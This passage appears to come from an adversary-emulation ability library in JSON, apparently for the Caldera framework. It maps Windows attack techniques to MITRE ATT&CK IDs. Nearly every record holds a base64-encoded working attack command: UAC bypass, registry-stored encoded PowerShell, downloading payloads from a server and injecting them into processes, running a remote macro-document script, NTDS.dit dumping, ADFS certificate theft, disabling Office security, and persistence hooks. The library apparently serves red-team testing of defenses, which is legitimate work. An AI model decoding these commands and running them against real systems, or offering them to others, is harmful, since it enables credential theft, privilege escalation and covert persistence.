"JE9yaWdpbmFsQ29tbWFuZCA9ICdXcml0ZS1Ib3N0ICJIZXksIEF0b21pYyEiJzsgJEJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkT3JpZ2luYWxDb21tYW5kKTsgJEVuY29kZWRDb21tYW5kID1bQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRCeXRlcyk7ICRFbmNvZGVkQ29tbWFuZDsgOyBTZXQtSXRlbVByb3BlcnR5IC1Gb3JjZSAtUGF0aCBIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uIC1OYW1lIERlYnVnIC1WYWx1ZSAkRW5jb2RlZENvbW1hbmQ7IHBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kICJJRVggKFtUZXh0LkVuY29kaW5nXTo6VU5JQ09ERS5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChncCBIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uIERlYnVnKS5EZWJ1ZykpKSI=", "ability_id": "3df459a1c6e933bc2afec5cfd0370699", "technique_name": "Obfuscated Files or Information", "additional_info": {}, "privilege": "", "technique_id": "T1027", "platform": "windows", "name": "Execute base64-encoded PowerShell from Windows Registry", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZSAtUGF0aCBIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uIC1OYW1lIERlYnVn"], "executor": "psh", "access": {}, "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n", "variations": []}, {"test": "JHVybD0iI3tzZXJ2ZXJ9L2ZpbGUvZG93bmxvYWQiOyAkd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDsgJHdjLkhlYWRlcnMuYWRkKCJwbGF0Zm9ybSIsIndpbmRvd3MiKTsgJHdjLkhlYWRlcnMuYWRkKCJmaWxlIiwic2FuZGNhdC5nbyIpOyAkZGF0YT0kd2MuRG93bmxvYWREYXRhKCR1cmwpOyAkbmFtZT0kd2MuUmVzcG9uc2VIZWFkZXJzWyJDb250ZW50LURpc3Bvc2l0aW9uIl0uU3Vic3RyaW5nKCR3Yy5SZXNwb25zZUhlYWRlcnNbIkNvbnRlbnQtRGlzcG9zaXRpb24iXS5JbmRleE9mKCJmaWxlbmFtZT0iKSs5KS5SZXBsYWNlKCJgIiIsIiIpOyBbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoIkM6XFVzZXJzXFB1YmxpY1wkbmFtZS5leGUiLCRkYXRhKTskam9iID0gU3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7IEltcG9ydC1Nb2R1bGUgLU5hbWUgLlxCeXBhc3MtVUFDLnBzMTsgQnlwYXNzLVVBQyAtQ29tbWFuZCAiQzpcVXNlcnNcUHVibGljXCRuYW1lLmV4ZSAtZ3JvdXAgI3tncm91cH0iOyB9O1JlY2VpdmUtSm9iIC1Kb2IgJGpvYiAtV2FpdDs=", "ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Bypass UAC Medium", "requirements": [], "tactic": "privilege-escalation", "buckets": ["privilege-escalation"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["Bypass-UAC.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJCeXBhc3MtVUFDLnBzMSI="], "executor": "psh", "access": {}, "description": "Bypass user account controls - medium", "variations": []}, {"test": "bXNpZXhlYy5leGUgL3EgL2kgIiN7bXNpX3BheWxvYWR9Ig==", "ability_id": "cea8aaa56f41e53a717692d1ed0bee4f", "technique_name": "Signed Binary Proxy Execution: Msiexec", "additional_info": {}, "privilege": "", "technique_id": "T1218.007", "platform": "windows", "name": "Msiexec.exe - Execute Local MSI file", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Execute arbitrary MSI file. Commonly seen in application installation. The MSI opens notepad.exe when sucessfully executed.\n", "variations": []}, {"test": "Y21kLmV4ZSAvYyAibmV0IHVzZSBcXFRhcmdldFxDJCBQQHNzdzByZDEgL3U6RE9NQUlOXEFkbWluaXN0cmF0b3Ii", "ability_id": "fe8f012ae5cdde2d5e3bba7b8ea95d93", "technique_name": "Remote Services: SMB/Windows Admin Shares", "additional_info": {}, "privilege": "", "technique_id": "T1021.002", "platform": "windows", "name": "Map admin share", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Connecting To Remote Shares\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSBBY3RpdmVEaXJlY3RvcnkgLUZvcmNlIDsgSW1wb3J0LU1vZHVsZSBBQURJbnRlcm5hbHMgLUZvcmNlIHwgT3V0LU51bGw7ICNHZXQgQ29uZmlndXJhdGlvbjsgJGRjU2VydmVyTmFtZSA9IChHZXQtQUREb21haW5Db250cm9sbGVyKS5Ib3N0TmFtZTsgJHN2YyA9IEdldC1BRE9iamVjdCAtZmlsdGVyICogLVByb3BlcnRpZXMgb2JqZWN0Z3VpZCxvYmplY3RzaWQgfCBXaGVyZS1PYmplY3QgbmFtZSAtZXEgIiN7YWRmc19zZXJ2aWNlX2FjY291bnRfbmFtZX0iOyAkUFdvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nIC1TdHJpbmcgIiN7cmVwbGljYXRpb25fcGFzc3dvcmR9IiAtQXNQbGFpblRleHQgLUZvcmNlOyAkQ3JlZGVudGlhbCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsIC1Bcmd1bWVudExpc3QgI3tyZXBsaWNhdGlvbl91c2VyfSwgJFBXb3JkOyAjIHVzZSBEQ1N5bmMgdG8gZmV0Y2ggdGhlIEFERlMgc2VydmljZSBhY2NvdW50J3MgTlQgaGFzaDsgJGhhc2ggPSBHZXQtQUFESW50QURVc2VyTlRIYXNoIC1PYmplY3RHdWlkICRzdmMuT2JqZWN0R3VpZCAtQ3JlZGVudGlhbHMgJENyZWRlbnRpYWwgLVNlcnZlciAkZGNTZXJ2ZXJOYW1lIC1Bc0hleDsgJEFERlNDb25maWcgPSBFeHBvcnQtQUFESW50QURGU0NvbmZpZ3VyYXRpb24gLUhhc2ggJGhhc2ggLVNJRCAkc3ZjLk9iamVjdHNpZC5WYWx1ZSAtU2VydmVyICN7YWRmc19zZXJ2ZXJfbmFtZX07ICMgR2V0IGNlcnRpZmljYXRlcyBkZWNyeXB0aW9uIGtleTsgJENvbmZpZ3VyYXRpb24gPSBbeG1sXSRBREZTQ29uZmlnOyAkZ3JvdXAgPSAkQ29uZmlndXJhdGlvbi5TZXJ2aWNlU2V0dGluZ3NEYXRhLlBvbGljeVN0b3JlLkRrbVNldHRpbmdzLkdyb3VwOyAkY29udGFpbmVyID0gJENvbmZpZ3VyYXRpb24uU2VydmljZVNldHRpbmdzRGF0YS5Qb2xpY3lTdG9yZS5Ea21TZXR0aW5ncy5Db250YWluZXJOYW1lOyAkcGFyZW50ID0gJENvbmZpZ3VyYXRpb24uU2VydmljZVNldHRpbmdzRGF0YS5Qb2xpY3lTdG9yZS5Ea21TZXR0aW5ncy5QYXJlbnRDb250YWluZXJEbjsgJGJhc2UgPSAiTERBUDovL0NOPSRncm91cCwkY29udGFpbmVyLCRwYXJlbnQiOyAkQURTZWFyY2ggPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyXTo6bmV3KFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldOjpuZXcoJGJhc2UpKTsgJEFEU2VhcmNoLkZpbHRlciA9ICcobmFtZT1DcnlwdG9Qb2xpY3kpJzsgJEFEU2VhcmNoLlByb3BlcnRpZXNUb0xvYWQuQ2xlYXIoKTsgJEFEU2VhcmNoLlByb3BlcnRpZXNUb0xvYWQuQWRkKCJkaXNwbGF5TmFtZSIpIHwgT3V0LU51bGw7ICRhZHVzZXIgPSAkQURTZWFyY2guRmluZE9uZSgpOyAka2V5T2JqZWN0R3VpZCA9ICRBRFVzZXIuUHJvcGVydGllc1siZGlzcGxheU5hbWUiXSA7ICRBRFNlYXJjaC5Qcm9wZXJ0aWVzVG9Mb2FkLkNsZWFyKCk7ICRBRFNlYXJjaC5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgidGh1bWJuYWlscGhvdG8iKSB8IE91dC1OdWxsOyAkQURTZWFyY2guRmlsdGVyPSIobD0ka2V5T2JqZWN0R3VpZCkiOyAkYWR1c2VyPSRBRFNlYXJjaC5GaW5kT25lKCkgOyAka2V5PVtieXRlW11dJGFkdXNlci5Qcm9wZXJ0aWVzWyJ0aHVtYm5haWxwaG90byJdWzBdIDsgIyBHZXQgZW5jcnlwdGVkIGNlcnRpZmljYXRlcyBmcm9tIGNvbmZpZ3VyYXRpb24gYW5kIGRlY3J5cHQgdGhlbTsgRXhwb3J0LUFBREludEFERlNDZXJ0aWZpY2F0ZXMgLUNvbmZpZ3VyYXRpb24gJEFERlNDb25maWcgLUtleSAka2V5OyBHZXQtQ2hpbGRJdGVtIHwgV2hlcmUtT2JqZWN0IHskXyAtbGlrZSAiQURGUyoifTsgV3JpdGUtSG9zdCAiYG5DZXJ0aWZpY2F0ZXMgcmV0cmlldmVkIHN1Y2Nlc3NmdWxseSI=", "ability_id": "a0a621085ca2a35fb54fdfeedc8ef1b2", "technique_name": "Unsecured Credentials: Private Keys", "additional_info": {}, "privilege": "", "technique_id": "T1552.004", "platform": "windows", "name": "ADFS token signing and encryption certificates theft - Remote", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIi5cQURGU19lbmNyeXB0aW9uLnBmeCIgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gLVBhdGggIi5cQURGU19zaWduaW5nLnBmeCIgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAiJGVudjpURU1QXFBvd2VyVmlldy5wczEiOyBHZXQtTmV0RG9tYWluVHJ1c3Q7IEdldC1OZXRGb3Jlc3RUcnVzdDsgR2V0LUFERG9tYWluOyBHZXQtQURHcm91cE1lbWJlciBBZG1pbmlzdHJhdG9ycyAtUmVjdXJzaXZl", "ability_id": "02878c3142e4a5a97c82c3c62d864d71", "technique_name": "Domain Trust Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1482", "platform": "windows", "name": "Powershell enumerate domains and forests", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n", "variations": []}, {"test": "V3JpdGUtSG9zdCAiQ3JlYXRpbmcgcmVnaXN0cnkga2V5cyBpbiBIS0NVOlNvZnR3YXJlXENsYXNzZXNcQ0xTSURcezA5MTA4ZTcxLTk3NGMtNDAxMC04OWNiLWFjZjQ3MWFlOWUyY30iIC1Gb3JlZ3JvdW5kQ29sb3IgQ3lhbjsgTmV3LUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXENsYXNzZXNcQ0xTSURcezA5MTA4ZTcxLTk3NGMtNDAxMC04OWNiLWFjZjQ3MWFlOWUyY31cSW5wcm9jU2VydmVyMzIiIC1WYWx1ZSA4M2YwMTZfVDE1NzQuMDEyeDY0LmRsbCAtRm9yY2UgfCBPdXQtTnVsbDsgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlxFbnZpcm9ubWVudCAtTmFtZSAiQ09SX0VOQUJMRV9QUk9GSUxJTkciIC1Qcm9wZXJ0eVR5cGUgU3RyaW5nIC1WYWx1ZSAiMSIgLUZvcmNlIHwgT3V0LU51bGw7IE5ldy1JdGVtUHJvcGVydHkgLVBhdGggSEtDVTpcRW52aXJvbm1lbnQgLU5hbWUgIkNPUl9QUk9GSUxFUiIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICJ7MDkxMDhlNzEtOTc0Yy00MDEwLTg5Y2ItYWNmNDcxYWU5ZTJjfSIgLUZvcmNlIHwgT3V0LU51bGw7IE5ldy1JdGVtUHJvcGVydHkgLVBhdGggSEtDVTpcRW52aXJvbm1lbnQgLU5hbWUgIkNPUl9QUk9GSUxFUl9QQVRIIiAtUHJvcGVydHlUeXBlIFN0cmluZyAtVmFsdWUgODNmMDE2X1QxNTc0LjAxMng2NC5kbGwgLUZvcmNlIHwgT3V0LU51bGw7IFdyaXRlLUhvc3QgImV4ZWN1dGluZyBldmVudHZ3ci5tc2MiIC1Gb3JlZ3JvdW5kQ29sb3IgQ3lhbjsgU1RBUlQgTU1DLkVYRSBFVkVOVFZXUi5NU0M=", "ability_id": "16b7ce2e6bb3e3590fa3e0d6d2d8c6d8", "technique_name": "Hijack Execution Flow: COR_PROFILER", "additional_info": {}, "privilege": "", "technique_id": "T1574.012", "platform": "windows", "name": "User scope COR_PROFILER", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["83f016_T1574.012x64.dll"], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXENsYXNzZXNcQ0xTSURcezA5MTA4ZTcxLTk3NGMtNDAxMC04OWNiLWFjZjQ3MWFlOWUyY30iIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlIDsgUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlxFbnZpcm9ubWVudCAtTmFtZSAiQ09SX0VOQUJMRV9QUk9GSUxJTkciIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlIHwgT3V0LU51bGw7IFJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggSEtDVTpcRW52aXJvbm1lbnQgLU5hbWUgIkNPUl9QUk9GSUxFUiIgLUZvcmNlIC1FcnJvckFjdGlvbiBJZ25vcmUgfCBPdXQtTnVsbDsgUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlxFbnZpcm9ubWVudCAtTmFtZSAiQ09SX1BST0ZJTEVSX1BBVEgiIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlIHwgT3V0LU51bGw=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI4M2YwMTZfVDE1NzQuMDEyeDY0LmRsbCI="], "executor": "psh", "access": {}, "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n", "variations": []}, {"test": "cmVnLmV4ZSBhZGQgSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcT2ZmaWNlXDE2LjBcT3V0bG9va1xXZWJWaWV3XEluYm94IC92IFVSTCAvdCBSRUdfU1ogL2QgZmlsZTovL2Q0M2JmY19UMTEzNy4wMDQuaHRtbCAvZg==", "ability_id": "78ca7a0f5cd7473d2f02e0a972a17ed4", "technique_name": "Office Application Startup: Outlook Home Page", "additional_info": {}, "privilege": "", "technique_id": "T1137.004", "platform": "windows", "name": "Install Outlook Home Page Persistence", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["d43bfc_T1137.004.html"], "cleanup": ["cmVnLmV4ZSBkZWxldGUgSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcT2ZmaWNlXDE2LjBcT3V0bG9va1xXZWJWaWV3XEluYm94IC92IFVSTCAvZiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n", "variations": []}, {"test": "d21pYyAvbm9kZToibG9jYWxob3N0IiBwcm9jZXNzIGNhbGwgY3JlYXRlICJjbWQuZXhlIC9jIGVzZW50dXRsLmV4ZSAveSAvdnNzIGM6XHdpbmRvd3NcbnRkc1xudGRzLmRpdCAvZCBjOlxudGRzLmRpdCI=", "ability_id": "895fada96bffd019fa66f273dda72667", "technique_name": "OS Credential Dumping: NTDS", "additional_info": {}, "privilege": "", "technique_id": "T1003.003", "platform": "windows", "name": "Create Volume Shadow Copy remotely (WMI) with esentutl", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIGJlMDMxNV9BbGxUaGVUaGluZ3N4NjQuZGxsLCMy", "ability_id": "2e5d4b9113d64d1d63292f95bfa4824e", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Rundll32 with Ordinal Value", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["be0315_AllTheThingsx64.dll"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n", "variations": []}, {"test": "VW5ibG9jay1GaWxlIC1QYXRoICRlbnY6dG1wXFJlYWRNZS5tZA==", "ability_id": "879f86e2b6a7c67d66a7e7d3215dc085", "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass", "additional_info": {}, "privilege": "", "technique_id": "T1553.005", "platform": "windows", "name": "Remove the Zone.Identifier alternate data stream", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U2V0LUNvbnRlbnQgLVBhdGggJGVudjp0bXBcUmVhZE1lLm1kIC1TdHJlYW0gWm9uZS5JZGVudGlmaWVyIC1WYWx1ZSAnW1pvbmVUcmFuc2Zlcl0nLCdab25lSWQ9Myc="], "executor": "psh", "access": {}, "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n", "variations": []}, {"test": "JHVybD0iI3tzZXJ2ZXJ9L2ZpbGUvZG93bmxvYWQiOyR3Yz1OZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyR3Yy5IZWFkZXJzLmFkZCgicGxhdGZvcm0iLCJ3aW5kb3dzIik7JHdjLkhlYWRlcnMuYWRkKCJmaWxlIiwic2hhcmVkLmdvIik7JHdjLkhlYWRlcnMuYWRkKCJzZXJ2ZXIiLCIje3NlcnZlcn0iKTskUEVCeXRlcyA9ICR3Yy5Eb3dubG9hZERhdGEoJHVybCk7JHdjMSA9IE5ldy1PYmplY3QgU3lzdGVtLm5ldC53ZWJjbGllbnQ7JHdjMS5oZWFkZXJzLmFkZCgiZmlsZSIsIkludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24ucHMxIik7SUVYICgkd2MxLkRvd25sb2FkU3RyaW5nKCR1cmwpKTtJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIC12ZXJib3NlIC1QQnl0ZXMgJFBFYnl0ZXMgLVByb2NJZCAje2hvc3QucHJvY2Vzcy5pZH0=", "ability_id": "a398986f-31b0-436a-87e9-c8e82c028f3c", "technique_name": "Process Injection: Portable Executable Injection", "additional_info": {}, "privilege": "", "technique_id": "T1055.002", "platform": "windows", "name": "Inject Sandcat into process", "requirements": [{"relationship_match": [{"source": "host.process.id"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Injects sandcat DLL into an available process", "variations": []}, {"test": "TmV3LUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxPZmZpY2VcMTYuMFxFeGNlbCI7IE5ldy1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcT2ZmaWNlXDE2LjBcRXhjZWxcU2VjdXJpdHkiOyBOZXctSXRlbSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwxNi4wXEV4Y2VsXFNlY3VyaXR5XFByb3RlY3RlZFZpZXciOyBOZXctSXRlbVByb3BlcnR5IC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcT2ZmaWNlXDE2LjBcRXhjZWxcU2VjdXJpdHkiIC1OYW1lICJWQkFXYXJuaW5ncyIgLVZhbHVlICIxIiAtUHJvcGVydHlUeXBlICJEd29yZCI7IE5ldy1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxPZmZpY2VcMTYuMFxFeGNlbFxTZWN1cml0eVxQcm90ZWN0ZWRWaWV3IiAtTmFtZSAiRGlzYWJsZUludGVybmV0RmlsZXNJblBWIiAtVmFsdWUgIjEiIC1Qcm9wZXJ0eVR5cGUgIkR3b3JkIjsgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwxNi4wXEV4Y2VsXFNlY3VyaXR5XFByb3RlY3RlZFZpZXciIC1OYW1lICJEaXNhYmxlVW5zYWZlTG9jYXRpb25zSW5QViIgLVZhbHVlICIxIiAtUHJvcGVydHlUeXBlICJEd29yZCI7IE5ldy1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxPZmZpY2VcMTYuMFxFeGNlbFxTZWN1cml0eVxQcm90ZWN0ZWRWaWV3IiAtTmFtZSAiRGlzYWJsZUF0dGFjaGVtZW50c0luUFYiIC1WYWx1ZSAiMSIgLVByb3BlcnR5VHlwZSAiRHdvcmQi", "ability_id": "b66a6eed7d46ab2ca4c3bf1ae3b61f44", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Disable Microsoft Office Security Features", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwxNi4wXEV4Y2VsXFNlY3VyaXR5IiAtTmFtZSAiVkJBV2FybmluZ3MiIC1FcnJvckFjdGlvbiBJZ25vcmUgfCBPdXQtTnVsbDsgUmVtb3ZlLUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxPZmZpY2VcMTYuMFxFeGNlbFxTZWN1cml0eVxQcm90ZWN0ZWRWaWV3IiAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "variations": []}, {"test": "U0NIVEFTS1MgL0NyZWF0ZSAvU0MgT05DRSAvVE4gc3Bhd24gL1RSIEM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZSAvU1QgMjA6MTA=", "ability_id": "ee454be9197890de62705ce6255933fd", "technique_name": "Scheduled Task/Job: Scheduled Task", "additional_info": {}, "privilege": "", "technique_id": "T1053.005", "platform": "windows", "name": "Scheduled task Local", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U0NIVEFTS1MgL0RlbGV0ZSAvVE4gc3Bhd24gL0YgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAuXHBvd2Vydmlldy5wczEgLUZvcmNlO0dldC1OZXRVc2VyIC1TUE4gfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMQ==", "ability_id": "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c", "technique_name": "System Owner/User Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1033", "platform": "windows", "name": "GetServiceAccounts", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "relationships": [{"edge": "", "source": "domain.user.name", "custom_parser_vals": {"json_key": "samaccountname", "json_type": "str"}, "target": ""}]}], "payloads": ["powerview.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJwb3dlcnZpZXcucHMxIg=="], "executor": "psh", "access": {}, "description": "Get Service Accounts for a domain", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7ICRtYWNyb0NvZGUgPSBHZXQtQ29udGVudCAiI3ttYWNyb19wYXRofSIgLVJhdzsgJFVSTCA9ICIje2MyX2RvbWFpbn0iICsgIi8iICsgIiN7YzJfcGFyZW50X2RpcmVjdG9yeX0iOyAkbWFjcm9Db2RlID0gJG1hY3JvQ29kZSAtcmVwbGFjZSAnc2VydmVyUGF0aCcsICRVUkwgLXJlcGxhY2UgJ2ZpbGVOYW1lJywgIiN7ZmlsZV9uYW1lfSI7IEludm9rZS1NYWxEb2MgLW1hY3JvQ29kZSAkbWFjcm9Db2RlIC1vZmZpY2VQcm9kdWN0ICIje21zX3Byb2R1Y3R9Ig==", "ability_id": "3ee7020bd7459eab27bae7e95e752e25", "technique_name": "User Execution: Malicious File", "additional_info": {}, "privilege": "", "technique_id": "T1204.002", "platform": "windows", "name": "Office Generic Payload Download", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRGVza3RvcFxodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmVkY2FuYXJ5Y28vYXRvbWljLXJlZC10ZWFtL21hc3Rlci9hdG9taWNzL1QxMjA0LjAwMi9zcmMvdGVzdDktZXhhbXBsZS1wYXlsb2FkLnR4dCIgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n", "variations": []}, {"test": "aGguZXhlIDg3OWVmNF9UMTIxOC4wMDEuY2ht", "ability_id": "22a16d5deb5384e691abf943cefad75b", "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "additional_info": {}, "privilege": "", "technique_id": "T1218.001", "platform": "windows", "name": "Compiled HTML Help Local Payload", "requirements": [], "tactic": "defense-evasion", 